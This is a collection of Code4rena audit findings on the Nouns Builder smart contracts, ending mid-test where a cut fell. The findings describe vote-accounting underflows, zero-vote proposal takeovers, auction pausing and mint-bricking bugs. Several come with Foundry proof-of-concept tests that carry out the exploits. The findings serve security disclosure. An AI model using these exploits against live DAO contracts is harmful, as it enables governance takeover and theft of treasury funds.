# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/Token.sol#L71-L126 https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/Token.sol#L154 https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/Token.sol#L207-L213   # Vulnerability details  ## Impact According to nouns builder, founder can have percentage of created nft. This is set in `Token::_addFounders` function.  When new nft is minted by `mint` function then total supply of tokens is incremented and assigned to tokenId using `tokenId = settings.totalSupply++`. Then this token is checked if it should be mint to founder(then again increment total supply of tokens) or should be mint to auction using `while (_isForFounder(tokenId))`.  If token wasn't sold during the auction then auction burns it using `burn` function. And this function doesn't decrement `settings.totalSupply` value. But total supply **has changed** now, it has decreased by one.  So suppose that we have 1 founder of dao that should receive 2% of nft, that means that if 100 nft are available(for example), then 2 of them belongs to that founder. If we have minted 100 nft and 10 of them were not sold(they were then burned), then there are 90 nft available now. And in current implementation founder has ownership of 2 of them, however **2 is not 2% of 90**. So in case when nft are not sold on auction the percentage of founder's tokens is increasing and the increasing speed depends on how many tokens were not sold. Also founder gets more power in the community(as he has more percentage now).   ## Proof of Concept https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/Token.sol#L71-L126 https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/Token.sol#L154 https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/Token.sol#L207-L213  ## Tools Used  ## Recommended Mitigation Steps When `burn` function is called then do `settings.totalSupply--`.
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/metadata/MetadataRenderer.sol#L194   # Vulnerability details  ## Impact It is not possible to mint a ERC721 token if its properties has different length than it's items.  ## Proof of Concept  I run the following test to reproduce the error:          deployMock();          vm.prank(address(governor));         string[] memory _names = new string[](1);         _names[0] = "propertyName"; //fill _names with some value         MetadataRendererTypesV1.ItemParam[] memory _items; //define empty array                  MetadataRendererTypesV1.IPFSGroup memory _ipfsGroup;          _ipfsGroup.baseUri = "";         _ipfsGroup.extension = "";         MetadataRenderer(token.metadataRenderer()).addProperties(_names, _items, _ipfsGroup); //call add property with _items array empty.          vm.stopPrank();         vm.prank(address(auction));          uint256 success = token.mint();//error happens inside here         assert(success != 0);          vm.stopPrank();           Log from Foundry console:      â”œâ”€ [736] TOKEN::metadataRenderer() [staticcall]     â”‚   â”œâ”€ [353] Token::metadataRenderer() [delegatecall]     â”‚   â”‚   â””â”€ â† METADATA_RENDERER: [0x7076fd06ec2d09d4679d9c35a8db81ace7a07ee2]     â”‚   â””â”€ â† METADATA_RENDERER: [0x7076fd06ec2d09d4679d9c35a8db81ace7a07ee2]     â”œâ”€ [78618] METADATA_RENDERER::addProperties(["propertyName"], [], ("", ""))     â”‚   â”œâ”€ [78172] MetadataRenderer::addProperties(["propertyName"], [], ("", "")) [delegatecall]     â”‚   â”‚   â”œâ”€ emit OwnerUpdated(prevOwner: FOUNDER: [0xd3562fd10840f6ba56112927f7996b7c16edfcc1], newOwner: TREASURY: [0xf8cf955543f1ce957b81c1786be64d5fc96ad7b5])           â”‚   â”‚   â”œâ”€ emit PropertyAdded(id: 0, name: "propertyName")     â”‚   â”‚   â””â”€ â† ()     â”‚   â””â”€ â† ()     â”œâ”€ [0] VM::stopPrank()     â”‚   â””â”€ â† ()     â”œâ”€ [0] VM::prank(AUCTION: [0x9a1450e42d752b8731bc88f20dbaa9154642f1e6])     â”‚   â””â”€ â† ()     â”œâ”€ [121037] TOKEN::mint()     â”‚   â”œâ”€ [120650] Token::mint() [delegatecall]     â”‚   â”‚   â”œâ”€ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: FOUNDER: [0xd3562fd10840f6ba56112927f7996b7c16edfcc1], tokenId: 0)     â”‚   â”‚   â”œâ”€ emit DelegateVotesChanged(delegate: FOUNDER: [0xd3562fd10840f6ba56112927f7996b7c16edfcc1], prevTotalVotes: 0, newTotalVotes: 1)     â”‚   â”‚   â”œâ”€ [25762] METADATA_RENDERER::onMinted(0)     â”‚   â”‚   â”‚   â”œâ”€ [25372] MetadataRenderer::onMinted(0) [delegatecall]     â”‚   â”‚   â”‚   â”‚   â””â”€ â† "Division or modulo by 0"     â”‚   â”‚   â”‚   â””â”€ â† "Division or modulo by 0"     â”‚   â”‚   â””â”€ â† "Division or modulo by 0"     â”‚   â””â”€ â† "Division or modulo by 0"     â””â”€ â† "Division or modulo by 0"    ## Tools Used Foundry Manual  ## Recommended Mitigation Steps It could be mitigated checking length of both arrays in MetadataRenderer.addProperties() method.  It could be done after those lines: https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/metadata/MetadataRenderer.sol#L111-L115  Also I recommend to move those declaration and new validation at the beginning to save gas.
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L204 https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L206 https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L235   # Vulnerability details  # Vulnerability details  ## Description  There is a function `_createAuction` in `Auction` contract.  It consist the following logic:  ``` /// @dev Creates an auction for the next token function _createAuction() private {     // Get the next token available for bidding     try token.mint() returns (uint256 tokenId) {         **creating of the auction for token with id equal to tokenId**          // Pause the contract if token minting failed     } catch Error(string memory) {         _pause();     } } ```  According to the [EIP-150](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-150.md) `call` opcode can consume as most `63/64` of parrent calls' gas. That means `token.mint()` can fail since there will be no gas.   All in all, if `token.mint()` fail on gas and the rest gas is enough for pausing the contract by calling `_pause` in `catch` statement the contract will be paused.  Please note, that a bug can be exploitable if the token.mint() consume more than 1.500.000 of gas, because 1.500.000 / 64 > 20.000 that need to pause the contract. Also, the logic of `token.mint()` includes traversing the array up to 100 times, that's heavy enough to reach 1.500.000 gas limit.   ## Impact  Contract can be paused by any user by passing special amount of gas for the call of `settleCurrentAndCreateNewAuction` (which consists of two internal calls of `_settleAuction` and `_createAuction` functions).  ## Recommended Mitigation Steps  Add a special check for upper bound of `gasLeft` at start of `_createAuction` function.
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L413-L456   # Vulnerability details  ## Impact When determining the proposal's state, the following `state` function is called, which can execute `else if (proposal.forVotes < proposal.againstVotes || proposal.forVotes < proposal.quorumVotes) { return ProposalState.Defeated; }`. If `proposal.forVotes` and `proposal.againstVotes` are the same, the proposal is not considered defeated when the quorum votes are reached by the for votes. However, many electoral systems require that the for votes to be more than the against votes in order to conclude that the proposal is passed because the majority of votes supports it. If the deployed DAO wants to require the majority of votes to support a proposal in order to pass it, the `state` function would incorrectly conclude that the proposal is not defeated when the for votes and against votes are the same at the end of voting. As a result, critical proposals, such as for updating implementations or withdrawing funds from the treasury, that should not be passed can be passed, or vice versa, so the impact can be huge.  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L413-L456 ```solidity     function state(bytes32 _proposalId) public view returns (ProposalState) {         // Get a copy of the proposal         Proposal memory proposal = proposals[_proposalId];          // Ensure the proposal exists         if (proposal.voteStart == 0) revert PROPOSAL_DOES_NOT_EXIST();          // If the proposal was executed:         if (proposal.executed) {             return ProposalState.Executed;              // Else if the proposal was canceled:         } else if (proposal.canceled) {             return ProposalState.Canceled;              // Else if the proposal was vetoed:         } else if (proposal.vetoed) {             return ProposalState.Vetoed;              // Else if voting has not started:         } else if (block.timestamp < proposal.voteStart) {             return ProposalState.Pending;              // Else if voting has not ended:         } else if (block.timestamp < proposal.voteEnd) {             return ProposalState.Active;              // Else if the proposal failed (outvoted OR didn't reach quorum):         } else if (proposal.forVotes < proposal.againstVotes || proposal.forVotes < proposal.quorumVotes) {             return ProposalState.Defeated;              // Else if the proposal has not been queued:         } else if (settings.treasury.timestamp(_proposalId) == 0) {             return ProposalState.Succeeded;              // Else if the proposal can no longer be executed:         } else if (settings.treasury.isExpired(_proposalId)) {             return ProposalState.Expired;              // Else the proposal is queued         } else {             return ProposalState.Queued;         }     } ```  ## Proof of Concept Please append the following test in `test\Gov.t.sol`. This test will pass to demonstrate the described scenario.  ```solidity     function test_ProposalIsSucceededWhenNumberOfForAndAgainstVotesAreSame() public {         vm.prank(founder);         auction.unpause();          createVoters(7, 5 ether);          vm.prank(address(treasury));         governor.updateQuorumThresholdBps(2000);          bytes32 proposalId = createProposal();          vm.warp(block.timestamp + governor.votingDelay());          // number of for and against votes are both 2         castVotes(proposalId, 2, 2, 3);          vm.warp(block.timestamp + governor.votingPeriod());          // the proposal is considered succeeded when number of for and against votes are the same after voting ends         assertEq(uint256(governor.state(proposalId)), uint256(ProposalState.Succeeded));          // the proposal can be queued afterwards         governor.queue(proposalId);         assertEq(uint256(governor.state(proposalId)), uint256(ProposalState.Queued));     } ```  ## Tools Used VSCode  ## Recommended Mitigation Steps If there is no need to pass a proposal when `proposal.forVotes` and `proposal.againstVotes` are the same at the end of voting, then https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L441-L442 can be changed to the following code. ```solidity         } else if (proposal.forVotes <= proposal.againstVotes || proposal.forVotes < proposal.quorumVotes) {             return ProposalState.Defeated; ```  Otherwise, a governance configuration can be added to indicate whether the majority of votes is needed or not for supporting and passing a proposal. The `state` function then could return `ProposalState.Defeated` when `proposal.forVotes <= proposal.againstVotes` if so and when `proposal.forVotes < proposal.againstVotes` if not.
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/metadata/MetadataRenderer.sol#L188-L198   # Vulnerability details  ## Description  When a token is minted, the ```MetadataRenderer.sol``` ```onMinted``` function is called which will set the particular token's attributes to a random item from one of the properties. A token has a maximum of 16 attributes, the first one being the total number of properties. The properties from which the token receives its attributes are supplied by the owner of the ```MetadataRenderer.sol``` contract by calling ```addProperties```. The issue is that the number of properties the owner can supply is not limited. If the number of properties is more than 15 then the ```onMinted``` function will revert due to the limit on the number of attributes a token may have.  ## Impact  Since ```onMinted``` is always called when tokens are minted, the DAO will not be able to mint new tokens. There does not seem to be a way to remove properties so this would be unrecoverable.  ## Proof of Concept  Test code added to ```Token.t.sol```: ```solidity     function test_MetadataProperties() public {         createUsers(2, 1 ether);          address[] memory wallets = new address[](2);         uint256[] memory percents = new uint256[](2);         uint256[] memory vestExpirys = new uint256[](2);          uint256 pct = 50;         uint256 end = 4 weeks;          unchecked {             for (uint256 i; i < 2; ++i) {                 wallets[i] = otherUsers[i];                 percents[i] = pct;                 vestExpirys[i] = end;             }         }          deployWithCustomFounders(wallets, percents, vestExpirys);          // Check deployed correctly         assertEq(token.totalFounders(), 2);         assertEq(token.totalFounderOwnership(), 100);          // Create 16 properties and items         string[] memory names = new string[](16);         MetadataRendererTypesV1.ItemParam[] memory items = new MetadataRendererTypesV1.ItemParam[](16);         for (uint256 j; j < 16; j++) {             names[j] = "aaa";                                                                               // Add random properties             items[j].name = "aaa";                                                                          // Add random items             items[j].propertyId = uint16(j);                                                                // Make sure all properties have items             items[j].isNewProperty = true;         }          MetadataRendererTypesV1.IPFSGroup memory group = MetadataRendererTypesV1.IPFSGroup(             "aaa",             "aaa"         );                                                                                                  // Add random IPFS group          // Add 16 properties         vm.prank(otherUsers[0]);         metadataRenderer.addProperties(names, items, group);          // Attempt to mint         vm.prank(address(auction));         vm.expectRevert(stdError.indexOOBError);         token.mint();     } ```  The test code above shows that the owner of ```MetadataRenderer.sol``` is able to add 16 properties with 1 items each. The ```auction``` contract is then unable to mint due to an "Index out of bounds" error.  Code from the ```onMinted``` function in ```MetadataRenderer.sol```: ```solidity             // For each property:             for (uint256 i = 0; i < numProperties; ++i) {                 // Get the number of items to choose from                 uint256 numItems = properties[i].items.length;                  // Use the token's seed to select an item                 tokenAttributes[i + 1] = uint16(seed % numItems);                  // Adjust the randomness                 seed >>= 16;             } ```  The code above shows that when a token is minted and ```onMinted``` is called it will attempt to assign more than 16 attributes to the token which is not possible due to the ```tokenAttributes``` being limited to 16.  ## Recommended Mitigation Steps  The maximum amount of properties an owner can add should be less than the maximum amount of attributes any token can have. Consider either limiting the ```properties``` variable in ```MetadataRenderer.sol``` to 15 or allow any number of attributes to be added to a token.
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L588   # Vulnerability details  ## Impact  The protocol assumes founders and proposals will set sane settings. However there are some settings that if set incorrectly will block proposals from being created or succeeding and block auctions from completing.  This vulnerability has a low likelihood of occurrence as the outcome is not in the interest of the community. However the possibility exists if there is some misunderstanding or miscalculation. If a bad setting is allowed the impact is high.  ## Proof of Concept  ### Bricking governance proposals  **Governor settings.quorumThresholdBps > 10_000**  If `quorumThresholdBps` is set above 10_000 then it would be impossible to get enough votes to succeed.  Without being able to execute a proposal the setting itself could never be fixed.  **Governor settings.proposalThresholdBps > 10_000**  If `proposalThresholdBps` is set above 10_000 then it would be impossible to submit a proposal.  Without being able to submit a proposal the setting itself could never be fixed.  ### Stalling a governance proposal  **Treasury settings.delay**  A very large value for `delay` would prevent a proposal from being executed.  For example 1000 years easily fits into `delay` and would result in a 1000 year wait before being able to execute.  A governance proposal could fix this property for future proposals but any proposal created with the large `delay` would remain stuck.  ### Stalling the auction  **Auction settings.duration**  The `duration` value is in seconds and any value up to type(uint40).max is permitted.  That is `1099511627775` seconds which is > 48000 years.  A large value like this would stop the auction from ever ending and thus stop new NFTs from being minted.  A governance proposal could fix this setting but ideally a very large `duration` would be blocked.  **Auction settings.timeBuffer**  Similar to duration but applies to the auction endTime extention.  So the auction could be extended a number of years for example.  ## Tools Used  Manual review.  ## Recommended Mitigation Steps  Implement reasonable range bounds reverting where appropriate. In particular for the above apply: - Governor settings `quorumThresholdBps` <= 10_000 - Governor settings `proposalThresholdBps` <= 10_000 - Treasury settings `delay` <= 6 months - Auction settings `duration` <= 6 months - Auction settings `timeBuffer` <= 6 months  Add these checks to the `initialize()` functions and in the setter / update functions where these individual settings properties can be updated. 
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L179-L190   # Vulnerability details  ERC721Votes's delegate() and delegateBySig() allow the delegation to zero address, which result in owner's votes elimination in the checkpoint. I.e. the votes are subtracted from the owner, but aren't added anywhere. _moveDelegateVotes() invoked by _delegate() treats the corresponding call as a burning, erasing the votes.  The impact is that the further transfer and burning attempts for the ids of the owner will be reverted because _afterTokenTransfer() callback will try to reduce owner's votes, which are already zero, reverting the calls due to subtraction fail.  As ERC721Votes is parent to Token the overall impact is governance token burning and transfer being disabled whenever the owner delegated to zero address. This can be done deliberately, i.e. any owner can disable burning and transfer of the owned ids at any moment, which can interfere with governance voting process.  ## Proof of Concept  User facing delegate() and delegateBySig() allow for zero address delegation:  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L131-L135  ```solidity     /// @notice Delegates votes to an account     /// @param _to The address delegating votes to     function delegate(address _to) external {         _delegate(msg.sender, _to);     } ```  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L144-L174  ```solidity     function delegateBySig(         address _from,         address _to,         uint256 _deadline,         uint8 _v,         bytes32 _r,         bytes32 _s     ) external {         // Ensure the signature has not expired         if (block.timestamp > _deadline) revert EXPIRED_SIGNATURE();          // Used to store the digest         bytes32 digest;          // Cannot realistically overflow         unchecked {             // Compute the hash of the domain seperator with the typed delegation data             digest = keccak256(                 abi.encodePacked("\x19\x01", DOMAIN_SEPARATOR(), keccak256(abi.encode(DELEGATION_TYPEHASH, _from, _to, nonces[_from]++, _deadline)))             );         }          // Recover the message signer         address recoveredAddress = ecrecover(digest, _v, _r, _s);          // Ensure the recovered signer is the voter         if (recoveredAddress == address(0) || recoveredAddress != _from) revert INVALID_SIGNATURE();          // Update the delegate         _delegate(_from, _to);     } ```  And pass zero address to the _delegate() where it is being set:  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L179-L190  ```solidity     function _delegate(address _from, address _to) internal {         // Get the previous delegate         address prevDelegate = delegation[_from];          // Store the new delegate         delegation[_from] = _to;          emit DelegateChanged(_from, prevDelegate, _to);          // Transfer voting weight from the previous delegate to the new delegate         _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));     } ```  In this case _moveDelegateVotes() will reduce the votes from the owner, not adding it to anywhere as `_from` is the owner, while `_to` is zero address:  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L203-L220  ```solidity             if (_from != _to && _amount > 0) {                 // If this isn't a token mint:                 if (_from != address(0)) {                     // Get the sender's number of checkpoints                     uint256 nCheckpoints = numCheckpoints[_from]++;                      // Used to store the sender's previous voting weight                     uint256 prevTotalVotes;                      // If this isn't the sender's first checkpoint: Get their previous voting weight                     if (nCheckpoints != 0) prevTotalVotes = checkpoints[_from][nCheckpoints - 1].votes;                      // Update their voting weight                     _writeCheckpoint(_from, nCheckpoints, prevTotalVotes, prevTotalVotes - _amount);                 }                  // If this isn't a token burn:                 if (_to != address(0)) { // @ audit here we add the votes to the target, but only if it's not zero address ```  The owner might know that and can use such a delegation to interfere with the system by prohibiting of transferring/burning of his ids.  This happens via _afterTokenTransfer() reverting as it's becomes impossible to reduce owner's votes balance by `1`:  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L262-L271  ```solidity     function _afterTokenTransfer(         address _from,         address _to,         uint256 _tokenId     ) internal override {         // Transfer 1 vote from the sender to the recipient         _moveDelegateVotes(_from, _to, 1);          super._afterTokenTransfer(_from, _to, _tokenId);     } ```  ## Recommended Mitigation Steps  Consider prohibiting zero address as a delegation destination:  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L179-L190  ```solidity     function _delegate(address _from, address _to) internal { +  if (_to == address(0)) revert INVALID_SIGNATURE();          // Get the previous delegate         address prevDelegate = delegation[_from];          // Store the new delegate         delegation[_from] = _to;          emit DelegateChanged(_from, prevDelegate, _to);          // Transfer voting weight from the previous delegate to the new delegate         _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));     } ```  When `_to` isn't zero there always be an addition in _moveDelegateVotes(), so the system votes balance will be sustained.    
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L268   # Vulnerability details  ## Impact  `aftertokenTransfer` in ERC721Votes transfers votes between user addresses instead of the delegated addresses, so a user can cause overflow in `_moveDelegates` and get unlimited votes  ## Proof of Concept  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L268  ```     function _afterTokenTransfer(         address _from,         address _to,         uint256 _tokenId     ) internal override {         // Transfer 1 vote from the sender to the recipient         _moveDelegateVotes(_from, _to, 1);          super._afterTokenTransfer(_from, _to, _tokenId);     } ``` https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L216  ```     _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));     ...     unchecked {                 ...                 // Update their voting weight                 _writeCheckpoint(_from, nCheckpoints, prevTotalVotes, prevTotalVotes - _amount);             } ``` During delegation `balanceOf(from)` amount of votes transferred are to the `_to` address  ```     function test_UserCanGetUnlimitedVotes() public {          vm.prank(founder);         auction.unpause();          vm.prank(bidder1);         auction.createBid{ value: 1 ether }(2);          vm.warp(10 minutes + 1 seconds);          auction.settleCurrentAndCreateNewAuction();                  assertEq(token.ownerOf(2), bidder1);          console.log(token.getVotes(bidder1)); // 1         console.log(token.delegates(bidder1)); // 0 bidder1          vm.prank(bidder1);         token.delegate(bidder2);          console.log(token.getVotes(bidder1)); // 1         console.log(token.getVotes(bidder2)); // 1          vm.prank(bidder1);         auction.createBid{value: 1 ether}(3);          vm.warp(22 minutes);          auction.settleCurrentAndCreateNewAuction();          assertEq(token.ownerOf(3), bidder1);          console.log(token.balanceOf(bidder1)); // 2         console.log(token.getVotes(bidder1)); // 2         console.log(token.getVotes(bidder2)); // 1          vm.prank(bidder1);                 token.delegate(bidder1);          console.log(token.getVotes(bidder1)); // 4         console.log(token.getVotes(bidder2)); // 6277101735386680763835789423207666416102355444464034512895        } ```  When user1 delegates to another address `balanceOf(user1)` amount of tokens are subtraced from user2's votes, this will cause underflow and not revert since the statements are unchecked  ## Tools Used  foundry  ## Recommended Mitigation Steps  Change delegate transfer in `afterTokenTransfer` to   ```         _moveDelegateVotes(delegates(_from), delegates(_to), 1); ```  
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L307-L335   # Vulnerability details  ## Impact  The auction parameters can be changed anytime, even during ongoing auctions, and take effect immediately. Users may need time to react to the changes. The impacts maybe followings: - some sudden changes may cause bidder's transaction fail, such as `setReservePrice()` and `setMinimumBidIncrement()` - some changes may change users expectation about the auction, such as `setDuration()` and `setTimeBuffer()`, with different time parameters, bidders will use different strategy   ## Proof of Concept  src/auction/Auction.sol ```solidity     function setDuration(uint256 _duration) external onlyOwner {         settings.duration = SafeCast.toUint40(_duration);          emit DurationUpdated(_duration);     }      function setReservePrice(uint256 _reservePrice) external onlyOwner {         settings.reservePrice = _reservePrice;          emit ReservePriceUpdated(_reservePrice);     }      function setTimeBuffer(uint256 _timeBuffer) external onlyOwner {         settings.timeBuffer = SafeCast.toUint40(_timeBuffer);          emit TimeBufferUpdated(_timeBuffer);     }      function setMinimumBidIncrement(uint256 _percentage) external onlyOwner {         settings.minBidIncrement = SafeCast.toUint8(_percentage);          emit MinBidIncrementPercentageUpdated(_percentage);     }```   ## Tools Used Manual analysis.  ## Recommended Mitigation Steps  - do not apply changed parameters on ongoing auctions  - add a timelock for the changes  
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L441   # Vulnerability details  It's possible to create a proposal for a DAO as soon as it's deployed and the proposal can pass even if nobody votes.  This possibility of doing so is based on the following assumptions: 1. The vetoer doesn't veto the proposal 2. `proposal.quorumVotes` is 0, which happens when `token.totalSupply() * settings.quorumThresholdBps < 10_000` 3. `proposal.proposalThreshold` is 0, which happens when `token.totalSupply() * settings.proposalThresholdBps < 10_000`  The amount of time necessary to create and execute a proposal of this kind is dictated by `governor.settings.votingDelay + governor.settings.votingDelay + treasury.delay()`, the lower the time the higher the risk.  ## Impact A malicious actor could build an off-chain script that tracks `DAODeployed` events on the `Manager.sol` contract. Every time a new DAO is spawned the script submits a proposal. This attack is based on the fact that such at an early stage nobody might notice and the chances of this happening are made real because every new DAO can be targeted.   A potential proposal created by an attacker might look like this: 1. Call `governor.updateVetoer(attacker)` 1. Call `governor.updateVotingDelay(0)` 2. Call `governor.updateVotingPeriod(0)` 3. Call `treasury.updateGracePeriod(0)` 4. Call `treasury.updateDelay(1 day)`  With this setup the attacker can make a proposal and queue it immediately to then execute it after 1 day time; which gives him the time to veto any proposal that tries to interfere with the attack. At this point the attacker has sudo powers and if there's any bid he can take the funds.  This is just one possible attack path, but the point is making a proposal pass can give an attacker sudo powers and nobody might notice for a while.  ## Proof of Concept Here's a test I wrote that proves the attack path outlined above, you can copy it into `Gov.t.sol` and execute it with `forge test -m test_sneakProposalAttack`:  ```javascript  function test_sneakProposalAttack() public {         address attacker = vm.addr(0x55);          address[] memory targets = new address[](5);         uint256[] memory values = new uint256[](5);         bytes[] memory calldatas = new bytes[](5);          // 1. Call `governor.updateVetoer(attacker)`         targets[0] = address(governor);         values[0] = 0;         calldatas[0] = abi.encodeWithSignature("updateVetoer(address)", attacker);          // 2. Call `governor.updateVotingDelay(0)`         targets[1] = address(governor);         values[1] = 0;         calldatas[1] = abi.encodeWithSignature("updateVotingDelay(uint256)", 0);          //3. Call `governor.updateVotingPeriod(0)`         targets[2] = address(governor);         values[2] = 0;         calldatas[2] = abi.encodeWithSignature("updateVotingPeriod(uint256)", 0);          //3. Call `treasury.updateGracePeriod(0)`         targets[3] = address(treasury);         values[3] = 0;         calldatas[3] = abi.encodeWithSignature("updateGracePeriod(uint256)", 0);          //4. Call `treasury.updateDelay(1 day)`         targets[4] = address(treasury);         values[4] = 0;         calldatas[4] = abi.encodeWithSignature("updateDelay(uint256)", 60 * 60 * 24);          //Attacker creates proposal as soon as contract is deployed         bytes32 proposalId = governor.propose(targets, values, calldatas, "");          //Wait for proposal.voteEnd         vm.warp((governor.getProposal(proposalId).voteEnd));          //Queue it         governor.queue(proposalId);          //Wait for treasury delay         vm.warp(block.timestamp + treasury.delay());          //Execute proposal         governor.execute(targets, values, calldatas, keccak256(bytes("")));          //Shows it's now possible for an attacker to queue a proposal immediately         bytes32 proposalId2 = governor.propose(targets, values, calldatas, "mock");         governor.queue(proposalId2);          //And executed it after one day         vm.warp(block.timestamp + 60 * 60 * 24);         governor.execute(targets, values, calldatas, keccak256(bytes("mock")));     }  ```  ## Recommended Mitigation Steps This potential attack path comes from a combination of factors, maninly: 1. A proposal can be created directly after deployment 2. The `proposal.proposal.proposalThreshold` and `proposal.quorumVotes` are set to 0 at such early stages 3. A proposal with 0 votes is allowed to pass  I would say that requiring at least 1 vote for a proposal to be considered `Succeeded` is rational and should mitigate this problem because that would require the attacker to bid on auction to get 1 voting power, increasing the cost and the time necessary for the attack.  At [Governor.sol#L441](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L441) we have:  ```javscript else if (proposal.forVotes < proposal.againstVotes || proposal.forVotes < proposal.quorumVotes) {         return ProposalState.Defeated; } ``` which can be changed to: ```javscript else if (proposal.forVotes == 0 || proposal.forVotes < proposal.againstVotes || proposal.forVotes < proposal.quorumVotes) {         return ProposalState.Defeated; } ``` 
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L475 https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L524   # Vulnerability details  Because the following happens:  1. Burned tokens votes are effectively deleted in `token._moveDelegateVotes()` when called by `token.burn()` 2. When an auction gets settled without bidders the function burns the token by calling `token.burn()` 3. When `_createAuction()` is called an amount of tokens >= 1 is minted, of which 1 is kept in the auction contract 4. The functions `governor.proposalThreshold()` and `governor.quorum()` both depend on `token.totalSupply()` for their calculations.  We can derive that the protocol calculates the `quorumVotes` taking into account burned tokens and tokens held in the auction contract, which don't have any actual voting power. In other words the actual `quorumThresholdBps` is equal or higher than the setted `quorumThresholdBps`.  ## Impact The worse case scenario that can happen is that the quorum gets so high that a proposal cannot pass even if everybody voted and everybody voted `for`, potentially locking funds into the contract.  We can define:  1. `assumedVotingPower` = `token.totalSupply()` 2. `realVotingPower` = `token.totalSupply() - amountOfTokensBurned` 3. `Î”VotingPower` = `amountOfTokensBurned`   This is the case if:  ``` realVotingPower at proposal.voteEnd < quorum at proposal.timeCreated ``` which is the same as  ``` realVotingPower < (assumedVotingPower * settings.quorumThresholdBps) / 10_000 ``` and rearranging in terms of `settings.quorumThresholdBps` we have:  ``` settings.quorumThresholdBps > 10_000 * realVotingPower/assumedVotingPower ```  Knowing that:  1. The possible range of values for `10_000 * realVotingPower/assumedVotingPower` is from `1` to `10000`. If `realVotingPower = 0` this model doesn't make sense in the first place.   2. The possible range of values of `settings.quorumThresholdBps` is from `1` to `2^16 - 1`. The protocol allows for `settings.quorumThresholdBps` to be `0`, in which case it means that the actual quorum is `0`; a context in which this model doesn't make sense. There's another catch that restricts this boundaries, if `settings.quorumThresholdBps * token.totalSupply()` < `10_000` the output of `governance.quorum()` would be `0`.   Many combinations of values in the ranges described above render this disequation true, note, however, that this describes the workings in a mathematical settings and it doesnt hold true for every case in a real setting because of roundings and approximations.  We can intuitevely notice that when `realVotingPower/assumedVotingPower` is very low, which is the case of a DAO with few tokens burned, the chances of the disequation being true are slim and when it's high the chances of the disequation being true become higher. The opposite is true for `settings.quorumThresholdBps`.  This might lock funds in DAOs with a lot of unsold auctions who have a low `settings.quorumThresholdBps`.  At early stages this is mitigated by the fact that for every possible token burned some tokens are minted to the founders, but when the vest expires this mitigation is not in place anymore.  ## Proof of concept  I wrote a test that's expected to revert a `proposal.queue()` even if all possible votes available are cast in favor.  The test comes with two parameters to set: `auctionsToRun` and `tokensToBidder`. The test runs `auctionsToRun` auctions, of which the first `tokensToBidder` are bidded upon and the rest are not. Then: 1. Creates a proposal 2. Cast all possible votes in favor 3. Tries to queue a proposal 4. Reverts  The default parameters are set to `auctionsToRun = 130` and `tokensToBidder = 10`. Also `quorumThresholdBps = 1000`. This test results in `121 tokens burned` and `133 token minted`. It's quite an unrealistic scenario, but it can get more real if `quorumThresholdBps` is setted lower. Keep in mind that this is the case in which everybody shows up to vote and averybody votes for.  ### Test code The test can be pasted inside `Gov.t.sol` and then run with:  `test -m test_RevertQueueProposalWithEverybodyInFavour`  ```javascript function test_RevertQueueProposalWithEverybodyInFavour() public {     //Number of auctions to run     uint256 auctionsToRun = 130;      